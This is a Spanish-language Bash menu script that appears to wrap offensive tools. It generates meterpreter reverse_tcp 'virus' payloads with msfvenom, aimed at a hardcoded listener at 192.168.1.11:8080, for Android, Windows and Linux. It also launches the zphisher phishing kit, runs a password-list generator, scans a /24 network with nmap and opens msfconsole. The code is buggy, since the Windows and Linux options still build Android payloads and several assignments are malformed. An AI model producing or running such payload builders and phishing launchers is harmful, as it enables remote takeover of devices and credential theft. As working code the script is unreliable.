#!bin/bash
while true; do
	sleep 1s
	clear
	source /HACKING-TOOLS/colores.sh
	pwd=""
	opt=""
	#virus
	virus=""
	virus_create=""
	virus_name=""
	virus_list=""
	virus_delate=""
	virus_rm=""
	#metasploit
	metasploit=""
	ip=""
	nombre=""

	menu= echo "
${R}[${W}01${R}]${O}Ataque (msfvenom)
${R}[${W}02${R}]${O}Phishing
${R}[${W}03${R}]${O}Generador de listas de contraseñas

${R}[${W}00${R}${O}Salir "
	read -p "${R}[${W}-${R}]${G} Selecciona una opcion:${B} " opt
	case $opt in 
		0 | 00)
			clear
			exit
		;;
		1 | 01)
			clear
			echo " 
${R}[${W}01${R}]${O}Crear virus 
${R}[${W}02${R}]${O}ELiminar virus
${R}[${W}03${R}]${O}Lista de virus 

${R}[${W}00${R}]${O}Salir "
			read -p "${R}[${W}-${R}]${G}Selecciona una opcion:${B} " virus
		    case $virus in 
		    	0 | 00)
					
				;;
		  		1 | 01) 
					clear
					echo "
${R}[${W}01${R}]${O}Android
${R}[${W}02${R}]${O}Windows
${R}[${W}03${R}]${O}Linux

${R}[${W}00${R}]${O}Salir "
				    read -p "${R}[${W}-${R}]${G}Selecciona el sistema opertativo de el virus:${B} " virus_create
				    case $virus_create in
				    	0 | 00)

				    	;;
				    	1 | 01)
							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
							virus_apk= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/APK/${virus_name}.apk
							echo virus_apk
							clear
							echo "${R}[${W}-${R}]${O}Guradando...${W} "
							sleep 2s
							echo "${R}[${W}-${R}]${O}Guardado con exito.${W}  "
							sleep 3s
							clear
					    ;;
						2 | 02)
							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
							virus_exe= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/EXE/${virus_name}.exe
							echo virus_exe
							clear
							echo "{R}[${W}-${R}]${O}Guradando...${W} "
							sleep 2s
							echo "${R}[${W}-${R}]${O}Guardado con exito.${W}  "
							sleep 3s
							clear
						;;
						3 | 03)
							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
							virus_deb= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/DEB/${virus_name}.deb
							echo virus_deb
							clear
							echo "${R}[${W}-${R}]${O}Guradando...${W} "
							sleep 2s
							echo "${R}[${W}-${R}]${O}Guardado con exito.${W}  "
							sleep 3s
							clear
					esac

				;;
				2 | 02)
					clear
					echo "
${R}[${W}01${R}]${O}Android
${R}[${W}02${R}]${O}Windows
${R}[${W}03${R}]${O}Linux

${R}[${W}00${R}]${O}Salir "
					read -p "${R}[${W}-${R}]${G}Selecciona una opcion:${B} " virus_delate
					case $virus_delate in 
						0 | 00)
						
						;;
						1 | 01)	
							cd /HACKING-TOOLS/virus/APK/
							virus_ls=$(ls /HACKING-TOOLS/virus/APK/  2>&1)
							echo "${B}|${G}$virus_ls${B}|"
							read -p "${R}[${W}-${R}]${G}Selection${B}  " virus_rm
							virus_rm2= rm -f ${virus_rm}
							echo "${G}Eliminando..."   
							sleep 3s
							echo "${G}Eliminado con exito."
							sleep 3s

						;;
						2 | 02)
							cd /HACKING-TOOLS/virus/EXE/
							virus_ls=$(ls /HACKING-TOOLS/virus/EXE/  2>&1)
							echo "${B}|${G}$virus_ls${B}|"
							read -p "${R}[${W}-${R}]${G} Selection${B}  " virus_rm
							virus_rm2= rm -f ${virus_rm}
							echo "${G}Eliminando..."   
							sleep 3s
							echo "${G}Eliminado con exito."
							sleep 3s

						;;
						3 | 03)	
							cd /HACKING-TOOLS/virus/DEB/
							virus_ls=$(ls /HACKING-TOOLS/virus/DEB/  2>&1)
							echo "${B}|${G}$virus_ls${B}"
							read -p "${R}[${W}-${R}]${G} Selection${B}  " virus_rm
							virus_rm2= rm -f ${virus_rm}
							echo "${G}Eliminando..."   
							sleep 3s
							echo "${G}Eliminado con exito."
							sleep 3s

					esac
							


				;;
				3 | 03) 
					clear
					echo "
${R}[${W}01${R}]${O}Android
${R}[${W}02${R}]${O}Windows
${R}[${W}03${R}]${O}Linux

${R}[${W}00${R}]${O}Salir "
					read -p "${R}[${W}-${R}]${G}Selecciona una opcion:${B} " virus_list
					case $virus_list in
						0 | 00)
							
						;;
						1 | 01)
							virus_ls=$(ls /HACKING-TOOLS/virus/APK/  2>&1)
							echo "${G}$virus_ls"
							sleep 5s 
						;;
						2 | 02)
							virus_ls=$(ls /HACKING-TOOLS/virus/EXE/  2>&1)
							echo "${G}$virus_ls"
							sleep 5s
						;;
						3 | 03)
							virus_ls=$(ls /HACKING-TOOLS/virus/DEB/  2>&1)
							echo "${G}$virus_ls"
							sleep 5s

					esac

			
			

		    esac
		
		;;
		2 | 02)
			cd /HACKING-TOOLS/phishing/zphisher/
			bash zphisher.sh

		;;
		3 | 03)
			cd /HACKING-TOOLS
			python3 generator.py

		;;
		4 | 04)
			echo "
${R}[${W}01${R}]${O}Escaneo de direccion ip
${R}[${W}02${R}]${O}msfdb init && msfconsole

${R}[${W}00${R}]${O}Salir "
			read -p "${R}[${W}-${R}]${G}Selecciona una opcion:${B} " metasploit
			case $metasploit in
				0| 00)
				
				;;
				1 | 01)
					cd /HACKING-TOOLS/Metasploit/
					read -p "${R}[${W}-${R}]${G}Ingrese la direccion ip que desea escanear: ${B}" ip
					read -p "${R}[${W}-${R}]${G}Ingresa nombre de el archivo donde se guradara el escaneo: " nombre
					echo "${R}[${O}!${R}]${G}Escaneando direccion ip. Porfavor espere esto puede rtardar unos minutos."
					escaneo=$(nmap -p- --open -sV -sC -Pn --min-rate 5000 -n -vvv ${ip}/24 -oN ${nombre})
					pwd=$(pwd)
					echo "El archivo se a guardado en ${pwd}"
					sleep 4
				;;
				2 | 02)
					msfdb init && msfconsole
		
					




			esac
	esac
done